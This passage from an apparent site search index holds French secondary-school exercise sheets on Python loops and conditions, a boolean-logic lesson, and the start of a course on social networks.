l'indentation dans la boucle</li> <li>Testez votre code avec diff\u00e9rentes valeurs</li> <li>Cr\u00e9ez un fichier Python diff\u00e9rent pour chaque exercice (ex: <code>exercice1.py</code>, <code>exercice2.py</code>, etc.)</li> <li>Recopiez vos programmes sur votre cahier pour pouvoir les r\u00e9viser plus tard</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#introduction-compte-a-rebours","title":"Introduction \ud83e\udd8a - Compte \u00e0 rebours","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre de d\u00e9part</li> <li>Affiche le compte \u00e0 rebours jusqu'\u00e0 0</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#introduction-tables-de-multiplication","title":"Introduction \ud83e\udd8a - Tables de multiplication","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre</li> <li>Affiche sa table de multiplication de 1 \u00e0 10</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#introduction-escalier-detoiles","title":"Introduction \ud83e\udd8a - Escalier d'\u00e9toiles","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre n</li> <li>Affiche un escalier de n marches avec des \u00e9toiles</li> </ul> <p>Astuce : pour afficher <code>x</code> fois un caract\u00e8re, on peut utiliser la syntaxe <code>'x' * n</code>.</p> <p>La cha\u00eene de caract\u00e8re \"XXXXX\" peut \u00eatre cr\u00e9\u00e9e via la syntaxe python suivante :</p> <pre><code>chaine_1 = \"XXXXX\"\nchaine_2 = \"X\"*5\n# avec chaine_1 == chaine_2\n</code></pre> <p>Exemple pour n=3:</p> <pre><code>*\n**\n***\n</code></pre>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#introduction-somme-des-nombres","title":"Introduction \ud83e\udd8a - Somme des nombres","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre n</li> <li>Calcule la somme des nombres de 1 \u00e0 n</li> <li>Affiche le r\u00e9sultat</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#introduction-puissance-de-2","title":"Introduction \ud83e\udd8a - Puissance de 2","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre n</li> <li>Affiche les puissances de 2 jusqu'\u00e0 2^n</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#introduction-message-repete","title":"Introduction \ud83e\udd8a - Message r\u00e9p\u00e9t\u00e9","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande une phrase</li> <li>Demande un nombre de r\u00e9p\u00e9titions</li> <li>Affiche la phrase autant de fois que demand\u00e9</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#niveau-facile","title":"\ud83c\udf1f Niveau Facile","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#facile-calculatrice-continue","title":"Facile \ud83e\udd8a - Calculatrice continue","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande deux nombres et une op\u00e9ration</li> <li>Affiche le r\u00e9sultat</li> <li>Demande si on veut continuer (oui/non)</li> <li>Recommence si la r\u00e9ponse est \"oui\"</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#niveau-intermediaire","title":"\ud83d\udd25 Niveau Interm\u00e9diaire","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#intermediaire-devinette-avec-limite","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Devinette avec limite","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Donne 5 essais pour deviner un nombre entre 1 et 100</li> <li>Affiche \"Perdu!\" si le nombre n'est pas trouv\u00e9 apr\u00e8s 5 essais</li> <li>Affiche le nombre d'essais utilis\u00e9s en cas de victoire</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#intermediaire-caisse-enregistreuse","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Caisse enregistreuse","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande le prix des articles un par un</li> <li>S'arr\u00eate quand on entre 0</li> <li>Affiche le total des achats</li> <li>Affiche la monnaie \u00e0 rendre sur un billet de 50\u20ac</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#niveau-difficile","title":"\ud83d\ude80 Niveau Difficile","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#difficile-pyramide-de-nombres","title":"Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a - Pyramide de nombres","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre n</li> <li>Affiche une pyramide de nombres</li> </ul> <p>Exemple pour n=3:</p> <pre><code>1\n22\n333\n</code></pre>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/","title":"Fiche d'exercices : Les conditions en Python","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#exercices-dintroduction","title":"\ud83c\udfaf Exercices d'introduction","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#important-consignes-importantes","title":"Important \u26a0\ufe0f - Consignes importantes","text":"<p>Pour tous les exercices :</p> <ul> <li>N'oubliez pas les deux points <code>:</code> apr\u00e8s la condition</li> <li>Faites attention \u00e0 l'indentation dans les blocs if/else</li> <li>Testez votre code avec diff\u00e9rentes valeurs</li> <li>Cr\u00e9ez un fichier Python diff\u00e9rent pour chaque exercice (ex: <code>exercice1.py</code>, <code>exercice2.py</code>, etc.)</li> <li>Recopiez vos programmes sur votre cahier pour pouvoir les r\u00e9viser plus tard</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#introduction-majorite","title":"Introduction \ud83e\udd8a - Majorit\u00e9","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande l'\u00e2ge d'une personne</li> <li>Affiche \"Vous \u00eates majeur\" si l'\u00e2ge est sup\u00e9rieur ou \u00e9gal \u00e0 18</li> <li>Affiche \"Vous \u00eates mineur\" sinon</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#introduction-nombre-positif-ou-negatif","title":"Introduction \ud83e\udd8a - Nombre positif ou n\u00e9gatif","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre</li> <li>Affiche si le nombre est positif, n\u00e9gatif ou nul</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#introduction-comparaison-de-deux-nombres","title":"Introduction \ud83e\udd8a - Comparaison de deux nombres","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande deux nombres</li> <li>Affiche lequel est le plus grand (ou s'ils sont \u00e9gaux)</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#introduction-mot-de-passe","title":"Introduction \ud83e\udd8a - Mot de passe","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un mot de passe</li> <li>Affiche \"Acc\u00e8s autoris\u00e9\" si le mot de passe est \"secret123\"</li> <li>Affiche \"Acc\u00e8s refus\u00e9\" sinon</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#introduction-nombre-pair-ou-impair","title":"Introduction \ud83e\udd8a - Nombre pair ou impair","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un nombre entier</li> <li>Affiche si le nombre est pair ou impair</li> </ul> <p>Astuce : Un nombre est pair si le reste de sa division par 2 est \u00e9gal \u00e0 0. En Python, on utilise l'op\u00e9rateur <code>%</code> pour obtenir le reste d'une division.</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#introduction-calculatrice-simple","title":"Introduction \ud83e\udd8a - Calculatrice simple","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande deux nombres et une op\u00e9ration (+, -, *, /)</li> <li>Affiche le r\u00e9sultat de l'op\u00e9ration</li> <li>G\u00e8re le cas de la division par z\u00e9ro</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#niveau-facile","title":"\ud83c\udf1f Niveau Facile","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#facile-note-et-mention","title":"Facile \ud83e\udd8a - Note et mention","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande une note sur 20</li> <li>Affiche la mention correspondante :</li> <li>Note &gt;= 16 : \"Tr\u00e8s bien\"</li> <li>Note &gt;= 14 : \"Bien\"</li> <li>Note &gt;= 12 : \"Assez bien\"</li> <li>Note &gt;= 10 : \"Passable\"</li> <li>Note &lt; 10 : \"Insuffisant\"</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#facile-temperature-et-conseil","title":"Facile \ud83e\udd8a - Temp\u00e9rature et conseil","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande la temp\u00e9rature ext\u00e9rieure</li> <li>Donne un conseil vestimentaire :</li> <li>Moins de 0\u00b0C : \"Portez un manteau d'hiver\"</li> <li>De 0 \u00e0 15\u00b0C : \"Portez une veste\"</li> <li>De 16 \u00e0 25\u00b0C : \"Un pull suffit\"</li> <li>Plus de 25\u00b0C : \"T-shirt recommand\u00e9\"</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#facile-jours-du-mois","title":"Facile \ud83e\udd8a - Jours du mois","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un num\u00e9ro de mois (1-12)</li> <li>Affiche le nombre de jours dans ce mois</li> <li>Consid\u00e8re f\u00e9vrier avec 28 jours</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#facile-triangle-possible","title":"Facile \ud83e\udd8a - Triangle possible","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande trois longueurs</li> <li>V\u00e9rifie si on peut former un triangle avec ces longueurs</li> <li>(Un triangle est possible si la somme de deux c\u00f4t\u00e9s est toujours sup\u00e9rieure au troisi\u00e8me)</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#facile-reduction-magasin","title":"Facile \ud83e\udd8a - R\u00e9duction magasin","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande le montant d'achat</li> <li>Applique une r\u00e9duction :</li> <li>Plus de 100\u20ac : 10% de r\u00e9duction</li> <li>Plus de 50\u20ac : 5% de r\u00e9duction</li> <li>Sinon : pas de r\u00e9duction</li> <li>Affiche le montant final</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#niveau-intermediaire","title":"\ud83d\udd25 Niveau Interm\u00e9diaire","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#intermediaire-equation-du-second-degre","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - \u00c9quation du second degr\u00e9","text":"<p>\u00c9crire un programme qui r\u00e9sout une \u00e9quation du second degr\u00e9 ax\u00b2 + bx + c = 0 :</p> <ul> <li>Demande les coefficients a, b et c</li> <li>Calcule le discriminant (\u0394 = b\u00b2 - 4ac)</li> <li>Affiche les solutions selon le cas :</li> <li>\u0394 &gt; 0 : deux solutions r\u00e9elles</li> <li>\u0394 = 0 : une solution double</li> <li>\u0394 &lt; 0 : pas de solution r\u00e9elle</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#intermediaire-tarif-de-cinema","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Tarif de cin\u00e9ma","text":"<p>\u00c9crire un programme qui calcule le prix d'un billet de cin\u00e9ma :</p> <ul> <li>Demande l'\u00e2ge</li> <li>Demande si on est \u00e9tudiant (r\u00e9ponse \"oui\" ou \"non\")</li> <li>Affiche le tarif :</li> <li>Moins de 14 ans : 5\u20ac</li> <li>\u00c9tudiant : 7\u20ac</li> <li>Normal : 9\u20ac</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#intermediaire-annee-bissextile","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Ann\u00e9e bissextile","text":"<p>\u00c9crire un programme qui d\u00e9termine si une ann\u00e9e est bissextile.</p> <p>Une ann\u00e9e est bissextile si :</p> <ul> <li>Elle est divisible par 4 mais pas par 100</li> <li>OU elle est divisible par 400</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#intermediaire-categories-dage","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Cat\u00e9gories d'\u00e2ge","text":"<p>\u00c9crire un programme qui d\u00e9termine la cat\u00e9gorie sportive selon l'\u00e2ge :</p> <ul> <li>Moins de 6 ans : \"Baby\"</li> <li>De 6 \u00e0 8 ans : \"Poussin\"</li> <li>De 9 \u00e0 11 ans : \"Pupille\"</li> <li>De 12 \u00e0 14 ans : \"Benjamin\"</li> <li>15 ans et plus : \"Cadet\"</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#niveau-difficile","title":"\ud83d\ude80 Niveau Difficile","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#difficile-distributeur-de-boissons","title":"Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a - Distributeur de boissons","text":"<p>\u00c9crire un programme qui simule un distributeur de boissons :</p> <ul> <li>Affiche un menu avec : 1-Eau (1\u20ac), 2-Soda (2\u20ac), 3-Jus (1.5\u20ac)</li> <li>Demande le choix de boisson</li> <li>Demande l'argent ins\u00e9r\u00e9</li> <li>Affiche si l'achat est possible et la monnaie \u00e0 rendre</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_conditions/#difficile-jeu-pierre-feuille-ciseaux","title":"Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a - Jeu Pierre-Feuille-Ciseaux","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande au joueur 1 de choisir entre \"pierre\", \"feuille\" ou \"ciseaux\"</li> <li>Demande au joueur 2 de choisir</li> <li>Affiche qui a gagn\u00e9 selon les r\u00e8gles du jeu</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/","title":"Fiche d'exercices : Python","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#exercices-dintroduction","title":"\ud83c\udfaf Exercices d'introduction","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#important-consignes-importantes","title":"Important \u26a0\ufe0f - Consignes importantes","text":"<p>Pour tous les exercices :</p> <ul> <li>Cr\u00e9ez un fichier Python diff\u00e9rent pour chaque exercice (ex: <code>exercice1.py</code>, <code>exercice2.py</code>, etc.)</li> <li>Testez votre code en l'ex\u00e9cutant</li> <li>N'h\u00e9sitez pas \u00e0 modifier les valeurs pour voir comment le programme r\u00e9agit</li> <li>Recopiez vos programmes sur votre cahier pour pouvoir les r\u00e9viser plus tard</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#introduction-premier-programme","title":"Introduction \ud83e\udd8a - Premier programme","text":"<p>\u00c9crire un programme qui affiche \"Bonjour le monde !\"</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#introduction-affichage-simple","title":"Introduction \ud83e\udd8a - Affichage simple","text":"<p>\u00c9crire un programme qui affiche votre pr\u00e9nom et votre \u00e2ge sur deux lignes diff\u00e9rentes.</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#introduction-calcul-simple","title":"Introduction \ud83e\udd8a - Calcul simple","text":"<p>\u00c9crire un programme qui calcule et affiche le r\u00e9sultat de 15 + 27.</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#introduction-variables","title":"Introduction \ud83e\udd8a - Variables","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Cr\u00e9e une variable <code>nom</code> avec votre nom</li> <li>Cr\u00e9e une variable <code>age</code> avec votre \u00e2ge</li> <li>Affiche ces informations</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#introduction-premiere-interaction","title":"Introduction \ud83e\udd8a - Premi\u00e8re interaction","text":"<p>\u00c9crire un programme qui demande le pr\u00e9nom de l'utilisateur et lui dit bonjour.</p> <p>Utilisez la fonction <code>input()</code> pour demander une information \u00e0 l'utilisateur</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#introduction-calcul-avec-variables","title":"Introduction \ud83e\udd8a - Calcul avec variables","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Cr\u00e9e deux variables avec des nombres de votre choix</li> <li>Calcule leur somme</li> <li>Affiche le r\u00e9sultat</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#niveau-facile","title":"\ud83c\udf1f Niveau Facile","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#facile-addition-de-deux-nombres","title":"Facile \ud83e\udd8a - Addition de deux nombres","text":"<p>\u00c9crire un programme qui demande deux nombres \u00e0 l'utilisateur et affiche leur somme.</p> <p>N'oubliez pas de convertir les entr\u00e9es en nombres avec <code>int()</code> ou <code>float()</code></p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#facile-calcul-de-perimetre","title":"Facile \ud83e\udd8a - Calcul de p\u00e9rim\u00e8tre","text":"<p>\u00c9crire un programme qui demande la longueur et la largeur d'un rectangle et calcule son p\u00e9rim\u00e8tre.</p> <p>Rappel : P\u00e9rim\u00e8tre = 2 \u00d7 (longueur + largeur)</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#facile-calcul-daire","title":"Facile \ud83e\udd8a - Calcul d'aire","text":"<p>\u00c9crire un programme qui demande le rayon d'un cercle et calcule son aire.</p> <p>Rappel : Aire = \u03c0 \u00d7 rayon\u00b2 (utilisez 3.14 pour \u03c0)</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#facile-conversion-de-temperature","title":"Facile \ud83e\udd8a - Conversion de temp\u00e9rature","text":"<p>\u00c9crire un programme qui convertit une temp\u00e9rature de Celsius en Fahrenheit.</p> <p>Formule : F = C \u00d7 9/5 + 32</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#facile-calcul-de-tva","title":"Facile \ud83e\udd8a - Calcul de TVA","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un prix hors taxes</li> <li>Calcule le montant de la TVA (20%)</li> <li>Affiche le prix TTC</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#facile-manipulation-de-chaines","title":"Facile \ud83e\udd8a - Manipulation de cha\u00eenes","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande le pr\u00e9nom et le nom de l'utilisateur</li> <li>Affiche son nom complet en majuscules</li> </ul> <p>Utilisez la m\u00e9thode <code>.upper()</code> pour mettre en majuscules</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#niveau-intermediaire","title":"\ud83d\udd25 Niveau Interm\u00e9diaire","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-calculatrice-simple","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Calculatrice simple","text":"<p>\u00c9crire un programme qui demande deux nombres et effectue les quatre op\u00e9rations de base (+, -, \u00d7, \u00f7).</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-conversion-dunites","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Conversion d'unit\u00e9s","text":"<p>\u00c9crire un programme qui convertit des m\u00e8tres en centim\u00e8tres, millim\u00e8tres et kilom\u00e8tres.</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-calcul-de-moyenne","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Calcul de moyenne","text":"<p>\u00c9crire un programme qui demande 4 notes et calcule la moyenne.</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-extraction-de-caracteres","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Extraction de caract\u00e8res","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un mot \u00e0 l'utilisateur</li> <li>Affiche la premi\u00e8re lettre</li> <li>Affiche la derni\u00e8re lettre</li> <li>Affiche la longueur du mot</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-calcul-de-remise","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Calcul de remise","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un prix initial</li> <li>Demande un pourcentage de remise</li> <li>Calcule et affiche le nouveau prix</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-conversion-eurosdollars","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Conversion euros/dollars","text":"<p>\u00c9crire un programme qui convertit des euros en dollars.</p> <p>Utilisez un taux de change de 1.09 (1 euro = 1.09 dollars)</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-calcul-dage","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Calcul d'\u00e2ge","text":"<p>\u00c9crire un programme qui demande l'ann\u00e9e de naissance d'une personne et calcule son \u00e2ge en 2024.</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-message-personnalise","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Message personnalis\u00e9","text":"<p>\u00c9crire un programme qui demande :</p> <ul> <li>Le pr\u00e9nom de l'utilisateur</li> <li>Sa mati\u00e8re pr\u00e9f\u00e9r\u00e9e</li> <li>Sa note dans cette mati\u00e8re</li> </ul> <p>Puis affiche un message personnalis\u00e9 comme: \"Bravo [pr\u00e9nom], tu as eu [note]/20 en [mati\u00e8re]!\"</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-calculateur-de-moyenne","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Calculateur de moyenne","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande 3 notes \u00e0 l'utilisateur</li> <li>Calcule la moyenne de ces notes</li> <li>Affiche la moyenne avec un message appropri\u00e9</li> </ul> <p>N'oubliez pas de convertir les entr\u00e9es en nombres d\u00e9cimaux avec <code>float()</code></p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-generateur-de-pseudo","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - G\u00e9n\u00e9rateur de pseudo","text":"<p>\u00c9crire un programme qui cr\u00e9e un pseudo \u00e0 partir :</p> <ul> <li>Des 3 premi\u00e8res lettres du pr\u00e9nom</li> <li>Des 2 premi\u00e8res lettres du nom</li> <li>De l'\u00e2ge</li> </ul> <p>Exemple: Pour \"Thomas Dupont, 15 ans\" \u2192 \"ThoDu15\"</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-prix-des-bonbons","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Prix des bonbons","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande le prix d'un bonbon</li> <li>Demande combien de bonbons on veut acheter</li> <li>Affiche le prix total</li> <li>Affiche combien il restera d'argent si on a 10 euros</li> </ul>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-convertisseur-de-temps","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Convertisseur de temps","text":"<p>\u00c9crire un programme qui convertit un nombre de minutes en heures et minutes.</p> <p>Exemple: 145 minutes = 2 heures et 25 minutes</p>"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_python/#intermediaire-message-decore","title":"Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a - Message d\u00e9cor\u00e9","text":"<p>\u00c9crire un programme qui :</p> <ul> <li>Demande un mot \u00e0 l'utilisateur</li> <li>Affiche ce mot entre des symboles d\u00e9coratifs</li> </ul> <p>Exemple: Pour le mot \"PYTHON\" \u2192 \" PYTHON \"</p>"},{"location":"seconde/IIII_-_Programmation_Python/structures_conditionnelles/","title":"Structures conditionnelles","text":""},{"location":"seconde/IIII_-_Programmation_Python/structures_conditionnelles/#definitions","title":"D\u00e9finitions","text":"<p>Une variable bool\u00e9enne est une variable qui peut prendre deux \u00e9tats : Vrai ou Faux. Ces \u00e9tats peuvent \u00eatre \u00e9quivalents \u00e0 des valeurs num\u00e9riques : Vrai = 1 et Faux = 0. Ces \u00e9tats correspondent en machine \u00e0 la pr\u00e9sence du courant ou non.</p> <p>Une fonction bool\u00e9enne est une fonction qui prend en param\u00e8tre des variables bool\u00e9ennes et en ressort un r\u00e9sultat.</p> <p>Une \u00e9quation bool\u00e9enne est un ensemble de fonctions bool\u00e9enne prenant en param\u00e8tre un certain nombre de variables et renvoie un r\u00e9sultat en sortie.</p>"},{"location":"seconde/IIII_-_Programmation_Python/structures_conditionnelles/#fonctions-booleennes","title":"Fonctions bool\u00e9ennes","text":"Fonction NOT Fonction OR Fonction AND"},{"location":"seconde/IIII_-_Programmation_Python/structures_conditionnelles/#exemples","title":"Exemples","text":"<p>En Python, on peut r\u00e9aliser des op\u00e9rations bool\u00e9ennes pour r\u00e9aliser des conditions. Ces conditions permettent de r\u00e9aliser du code, comme ce qui a \u00e9t\u00e9 vu au coll\u00e8ge avec les <code>logigrammes</code> ou <code>algorigrammes</code>.</p> <p>En Python, pour indiquer qu'une chose est vraie, on \u00e9crit <code>True</code> ou fausse <code>False</code>.</p> <p>Il existe les op\u00e9rateurs : </p> <ul> <li>a == b : qui signifie <code>Est-ce que a est \u00e9gal \u00e0 b?</code></li> <li>a != b : qui signifie <code>Est-ce que a est diff\u00e9rent de b?</code></li> <li> <p>Les op\u00e9rateurs math\u00e9matiques de base : <code>&gt; , &lt; , &gt;= , &lt;=</code></p> </li> <li> <p><code>10 &gt; 5</code> \u2794 <code>True</code></p> </li> <li><code>7 == 9</code> \u2794 <code>False</code></li> <li><code>3 &lt;= 3</code> \u2794 <code>True</code></li> <li><code>False != True</code> \u2794 <code>_______</code> </li> <li><code>not False</code> \u2794 <code>_______</code> (Fonction bool\u00e9enne NOT, voir tableau)</li> <li><code>5 != 5</code> \u2794 <code>_______</code></li> <li><code>False != True and 5 == 5</code> \u2794 <code>______</code> (Fonction bool\u00e9enne AND, voir tableau)</li> <li><code>not True or 4 &gt; 99</code> \u2794 <code>______</code> (Fonction bool\u00e9enne OR, voir tableau)</li> </ul>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/","title":"\ud83d\udcf1 Les R\u00e9seaux Sociaux : D\u00e9finitions et Enjeux","text":""},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#quest-ce-quun-reseau-social","title":"\ud83d\udcd6 Qu'est-ce qu'un r\u00e9seau social ?","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Un r\u00e9seau social num\u00e9rique est une plateforme en ligne qui permet aux utilisateurs de cr\u00e9er un profil, de se connecter avec d'autres personnes et de partager du contenu (textes, images, vid\u00e9os).</p> <p>Activit\u00e9 : Analyse comparative</p> <p>Choisissez un r\u00e9seau social et analysez : - Fondateur(s) et date de cr\u00e9ation - Sp\u00e9cificit\u00e9 principale (texte, image, vid\u00e9o...) - Public cible et nombre d'utilisateurs - Mod\u00e8le \u00e9conomique</p>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#types-de-contenus-et-specialisations","title":"\ud83d\udcf1 Types de contenus et sp\u00e9cialisations","text":""},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#diversite-des-contenus-numeriques","title":"\ud83c\udfaf Diversit\u00e9 des contenus num\u00e9riques","text":"Type de contenu Caract\u00e9ristiques R\u00e9seaux sp\u00e9cialis\u00e9s Impact Texte court Messages limit\u00e9s (280 caract\u00e8res) Twitter, Threads Information rapide, d\u00e9bats Images Photos, illustrations, memes Instagram, Pinterest Expression cr\u00e9ative, lifestyle Vid\u00e9os courtes 15s \u00e0 3min, format vertical TikTok, YouTube Shorts, Reels Divertissement, viralit\u00e9 Vid\u00e9os longues Contenu \u00e9ducatif, entertainment YouTube, Twitch Apprentissage, communaut\u00e9s Audio Podcasts, discussions en direct Clubhouse, Spaces, Discord Conversations approfondies Professionnel CV, articles, networking LinkedIn Carri\u00e8re, business"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#histoire-des-reseaux-sociaux","title":"\ud83d\udcda Histoire des r\u00e9seaux sociaux","text":"<p>Les r\u00e9seaux sociaux ont vu le jour au d\u00e9but des ann\u00e9es 2000, en plein dans l'expansion du num\u00e9rique dans les foyers. Certains n'avaient pas forc\u00e9ment comme but d'\u00eatre ceux qu'ils sont actuellement (comme Facebook qui initialement servait \u00e0 relier les \u00e9tudiants de Harvard).</p>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#financement-dun-reseau-social","title":"\ud83d\udcd6 Financement d'un r\u00e9seau social","text":"<p>Un r\u00e9seau social est associ\u00e9 \u00e0 un mod\u00e8le \u00e9conomique. De grandes soci\u00e9t\u00e9s financent des r\u00e9seaux sociaux \u00e0 des fins lucratives (pour cr\u00e9er des b\u00e9n\u00e9fices). Il existe un bon nombre de co\u00fbts li\u00e9s \u00e0 l'utilisation pour les particuliers de r\u00e9seaux sociaux.</p> <p>Lister quels co\u00fbts peuvent 